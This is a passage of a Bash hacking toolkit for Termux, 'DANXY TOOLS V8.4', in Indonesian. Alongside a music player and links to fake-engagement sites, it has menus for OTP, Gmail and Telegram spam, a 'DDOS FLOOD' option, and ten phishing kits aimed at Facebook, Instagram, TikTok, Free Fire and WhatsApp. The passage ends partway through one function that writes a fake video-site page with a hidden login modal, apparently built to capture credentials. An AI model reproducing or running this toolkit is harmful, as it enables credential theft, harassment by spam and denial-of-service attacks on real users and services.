      a)    add_url ;; 
      d)    delete_url ;; 
      l)    list_playlist ;;
      s)   
            if [ "$SHUFFLE" = "on" ]; then SHUFFLE="off"; else SHUFFLE="on"; fi
            build_play_order
            echo -e "${G}[ ⇆ ] Shuffle: $SHUFFLE${W}"; sleep 0.8 ;;
      r)    
            if [ "$REPEAT" = "off" ]; then REPEAT="all"
            elif [ "$REPEAT" = "all" ]; then REPEAT="one"
            else REPEAT="off"; fi
            echo -e "${G}[ ↺ ] Repeat: $REPEAT${W}"; sleep 0.8 ;;
    esac
  done
  tput cnorm
  cleanup
}


album_manager_menu() {
  while true; do
    clear
    echo -e "${GR}=====[ ALBUM MANAGER ]=====${W}"
    echo -e "Album dir: ${C}$ALBUM_DIR${W}"
    list_albums
    echo -e " 1) Pilih album"
    echo -e " 2) Buat album baru"
    echo -e " 3) Hapus album"
    echo -e " 4) Keluar Dari Musik Album"
    echo -ne " Pilih [0-4]: "
    read -r opt
    case "$opt" in
      1) 
         select_album
         if [ -n "$ALBUM_FILE" ]; then
           load_playlist
           album_actions_menu   # masuk ke menu aksi album
         fi
         ;;
      2) create_album ;;
      3) delete_album ;;
      4) return ;;   # balik ke menu utama / keluar dari loop
      *) echo -e "${R}PILIHAN TIDAK VALID${W}"; sleep 1 ;;
    esac
  done
}

album_actions_menu() {
  
  while true; do
    clear
    echo -e "${GR}===== ALBUM: ${ALBUM_NAME} =====${W}"
    echo -e " Lagu: ${C}${#PLAYLIST[@]}${W}"
    echo -e " 1) Lihat playlist"
    echo -e " 2) Tambah URL"
    echo -e " 3) Hapus URL"
    echo -e " 4) Putar musik"
    echo -e " 5) Kembali ke album list"
    echo -ne " Pilih [1-5]: "
    read -r o
    case "$o" in
      1) list_playlist ;;
      2) add_url ;;
      3) delete_url ;;
      4) 
         if [ ${#PLAYLIST[@]} -eq 0 ]; then
           echo -e "${R}[ ∅ ] Album kosong. Tambah dulu.${W}"
           sleep 1.2
         else
           SHUFFLE="off"
           REPEAT="off"
           build_play_order
           ORDER_POS=0
           play_current_order
           main_loop
         fi
         ;;
      5) return 0 ;;
      *) echo "Pilihan tidak valid"; sleep 1 ;;
    esac
  done
}

install_deps
album_manager_menu
}

menu_suntik() {
  # auto-install yt-dlp
  command -v yt-dlp >/dev/null || { pkg install -y yt-dlp; }

  while true; do
    clear
    echo -e "${RED}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ ░█████╗░██╗░░░░░██╗░░░░░░██████╗██╗░░░██╗███╗░░██╗  │
  │ ██╔══██╗██║░░░░░██║░░░░░██╔════╝██║░░░██║████╗░██║  │
  │ ███████║██║░░░░░██║░░░░░╚█████╗░██║░░░██║██╔██╗██║  │
  ${WHITE}│ ██╔══██║██║░░░░░██║░░░░░░╚═══██╗██║░░░██║██║╚████║  │
  │ ██║░░██║███████╗███████╗██████╔╝╚██████╔╝██║░╚███║  │
  │ ╚═╝░░╚═╝╚══════╝╚══════╝╚═════╝░░╚═════╝░╚═╝░░╚══╝  │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │                ${BG_RED}${YELLOW}ALL BASE FITUR SUNTIK${NC}                │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
   ${BG_RED}${WHITE}CODE BY DANXY${NC}                          ${BG_RED}${WHITE}FITUR BY RANGG${NC}"
    echo "
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK TIKTOK                 │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┤
  │ [  01  ] LIKE TIKTOK                               │
  │ [  02  ] FOLLOWERS TIKTOK                          │
  │ [  03  ] VIEW / PENONTON TIKTOK                    │
  │ [  04  ] FAVORIT TIKTOK                            │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK INSTAGRAM              │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [  05  ] FOLLOWERS INSTAGRAM                       │
  │ [  06  ] LIKE INSTAGRAM                            │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK YOUTUBE                │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [  07  ] SUBSCRIBE YOUTUBE                         │
  │ [  08  ] LIKE VIDEO YOUTUBE                        │
  │ [  09  ] VIEW / PENONTON YOUTUBE                   │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK TWITTER                │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [  10  ] FOLLOWERS TWITTER                         │
  │ [  11  ] RETWEET TWITTER                           │
  │ [  12  ] LIKE TWITTER                              │
  │ [  13  ] VIEW TWITTER                              │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [  00  ] EXIT / KELUAR                             │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
      printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU SUNTIK${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
      read -r SUNTIK_MENU
    case $SUNTIK_MENU in
      01|1)
      klik
      like_titok
      klik 
       ;;
      02|2)
      klik
      ltitok_follow
      klik
      ;;
      03|3)
      klik
      view_titok
      klik
      ;;
      04|4)
      klik
      favorit_titok
      klik
       ;;
      05|5)
      klik
      followIG
      klik
      ;;
      06|5)
      klik
      likeIG
      klik
      ;;
      07|7)
      klik
      subscribeYT
      klik
      ;;
      08|8)
      klik
      like_YT
      klik
      ;;
      09|9)
      klik
      viewYT
      klik
      ;;
      10)
      klik
      foll
      klik
      ;;
      11)
      klik
      retwet
      klik
      ;;
      12)
      klik
      likeTwet
      klik
      ;;
      13)
      klik
      viewTwi
      klik
      ;;
      00|0) break ;;
      *) echo -e "${R}PILIHAN TIDAK VALID${N}"; sleep 1 ;;
    esac
  done
}



like_titok() {
clear
loading
  xdg-open "https://www.famety.net/free-tiktok-likes" &
}
ltitok_follow() {
clear
loading
  xdg-open "https://www.famety.net/free-tiktok-fans" &
}
view_titok() {
clear
loading
  xdg-open "https://www.famety.net/free-tiktok-views" &
}
favorit_titok() {
clear
loading
  xdg-open "https://www.famety.net/free-tiktok-saves" &
}
followIG() {
clear
loading
  xdg-open "https://www.famety.net/free-instagram-followers" &
}
likeIG() {
clear
loading
  xdg-open "https://www.famety.net/get-free-instagram-likes" &
}
subscribeYT() {
clear
loading
  xdg-open "https://www.famety.net/free-youtube-subscribers" &
}
like_YT() {
clear
loading
  xdg-open "https://www.famety.net/free-youtube-likes" &
}
viewYT() {
clear
loading
  xdg-open "https://www.famety.net/free-youtube-views" &
}
foll() {
clear
loading
  xdg-open "https://www.famety.net/free-twitter-x-followers" &
}
retwet() {
clear
loading
  xdg-open "https://www.famety.net/get-free-twitter-x-retweets" &
}
likeTwet() {
clear
loading
  xdg-open "https://www.famety.net/free-twitter-x-likes" &
}
viewTwit() {
clear
loading
  xdg-open "https://www.famety.net/free-twitter-x-views" &
}




downloader_menu() {
  clear
    echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⣿⣿⣿⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⢸⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡗⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡗⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡧⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣻⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⣡⣶⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣶⣄⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠋⠀⢠⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣄⠀⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡗⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡧⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⢈⣿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⡀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡧⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⢀⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠈⠉⠛⠿⢿⣶⣶⣤⣼⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣧⣤⣶⣾⡿⠿⠛⠋⠁⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠿⠿⠿⠿⠿⣿⣶⣶⣿⣿⣿⣶⣾⡿⠿⠿⠿⠿⠟⠛⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⠿⢿⣶⣶⣶⣤⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣶⣶⣶⡿⠿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠈⠹⣿⣿⣿⣿⡿⠛⠿⠻⠿⠿⣿⣿⣿⠿⠿⠟⠟⠛⢿⣿⣿⣿⣿⡏⠁⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⢹⣿⣿⣿⡏⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠹⣿⡟⠀⠀⠀⠀⠀⢀⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠀⠀⠀⠀⠀⢼⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⡀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣴⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │        VIDEO & MP3 DOWNLOADER BY DANXY TOOLS V8.4        │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    xdg-open "https://danxy-downloader.pages.dev" &
}

menu_spam() {
  while true; do
    clear
    echo -e "${RED}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ ░██████╗██████╗░░█████╗░███╗░░░███╗███████╗██████╗  │
  │ ██╔════╝██╔══██╗██╔══██╗████╗░████║██╔════╝██╔══██╗ │
  │ ╚█████╗░██████╔╝███████║██╔████╔██║█████╗░░██████╔╝ │
  ${WHITE}│ ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██╔══╝░░██╔══██╗ │
  │ ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║███████╗██║░░██║ │
  │ ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝ │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │                ${BG_RED}${YELLOW}ALL BASE FITUR SPAMER${NC}                │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    echo "
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                     MENU SPAM                      │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┤
  │ [  01  ] SPAM NGL V0.1                             │
  │ [  02  ] SPAM OTP V0.1                             │
  │ [  03  ] SPAM GAMIL V0.1                           │
  │ [  04  ] SPAM TELEGRAM V0.1                        │
  │ [  05  ] SPAM OTP V0.2                             │
  │ [  06  ] DDOS FLOOD                                │
  │ [  00  ] Kembali                                   │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
      printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU SPAM${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
      read -r SPAM_MENU
    case $SPAM_MENU in
      01|1)
      klik
      ngl_spam
      klik 
      ;; 
      02|2)
      klik
      spam_otp
      klik
      ;;
      03|3)
      klik
      spam_gmail
      klik
      ;;
      04|4)
      klik
      spam_tg
      klik
      ;;
      05|5)
      klik
      SpamOtpV
      klik
      ;;
      06|6)
      klik
      ddos
      klik
      ;;
      00|0) break ;;
      *) echo -e "${R}PILIHAN TIDAK VALID${N}"; sleep 1 ;;
    esac
  done
}

phising_menu() {

  while true; do
    clear
    echo -e "
    ${WHITE} 
   ██████╗░██╗░░██╗██╗░██████╗██╗███╗░░██╗░██████╗ 
   ██╔══██╗██║░░██║██║██╔════╝██║████╗░██║██╔════╝ 
   ██████╔╝███████║██║╚█████╗░██║██╔██╗██║██║░░██╗ 
   ██╔═══╝░██╔══██║██║░╚═══██╗██║██║╚████║██║░░╚██╗
   ██║░░░░░██║░░██║██║██████╔╝██║██║░╚███║╚██████╔╝
   ${NC}${RED}╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝
   ${BG_RED}${YELLOW}CODE BY DANXY${NC}                  ${BG_RED}TOOLS V8.4${NC}"
   echo " 
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 │ [  1  ] PHISING GAME AR V0.1                      │
 │ [  2  ] PHISING FACEBOOK                          │
 │ [  3  ] PHISING INSTAGRAM                         │
 │ [  4  ] PHISING TIKTOK                            │
 │ [  5  ] PHISING FREE FIRE                         │
 │ [  6  ] PHISING SPIN BERHADIAH                    │
 │ [  7  ] PHISING SUNTIK TIKTOK                     │
 │ [  8  ] PHISING PROFESIONAL                       │
 │ [  9  ] PHISING BAN WHATSAPP                      │
 │ [  10 ] PHISING BOKEP                             │
 │ [  0  ] KEMBALI                                   │
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 │               ALL BASE FITUR PHISING              │
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU PHISING${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r CHOICE

    case $CHOICE in
      1)
      klik
      phising_tele
      klik 
       ;;
       2)
       klik
       phising_FB
       klik
       ;;
       3)
       klik
       phising_IG
       klik
       ;;
       4)
       klik
       phising_TT
       klik
       ;;
       5)
       klik
       phising_FF
       klik
       ;;
       6)
       klik
       phising_SPIN
       klik
       ;;
       7)
       klik
       phising_TTSUNTIK
       klik
       ;;
       8)
       klik
       phising_PRO
       klik
       ;;
       9)
       klik
       phising_INJECT
       klik
       ;;
       10)
       klik
       BokepPish
       klik
       ;;
      0) break ;;
      *) echo -e "${R}INPUT TIDAK VALID${N}"; sleep 1 ;;
    esac
  done
}


#####################################################
#####################################################

BokepPish(){
    WORK_DIR="$HOME/DanxyPro"
    mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
    trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
    
    cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Platform Premium</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .video-section {
            text-align: center;
            width: 100%;
            max-width: 800px;
        }
        .video-container {
            position: relative;
            width: 100%;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        .video-player {
            width: 100%;
            height: auto;
            display: block;
        }
        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 20px;
        }
        .play-button {
            background: rgba(3, 233, 244, 0.2);
            color: #03e9f4;
            border: 2px solid #03e9f4;
            padding: 15px 30px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 20px;
        }
        .play-button:hover {
            background: #03e9f4;
            color: #000;
            box-shadow: 0 0 15px rgba(3, 233, 244, 0.5);
        }
        .login-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(15px);
        }
        .login-container {
            position: relative;
            width: 400px;
            max-width: 90vw;
            padding: 40px 30px;
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.15);
            animation: modalAppear 0.5s ease-out;
        }
        @keyframes modalAppear {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .close-modal {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            transition: color 0.3s;
        }
        .close-modal:hover {
            color: #03e9f4;
        }
        .modal-logo {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .modal-logo img {
            width: 60px;
            height: auto;
        }
        .modal-title {
            text-align: center;
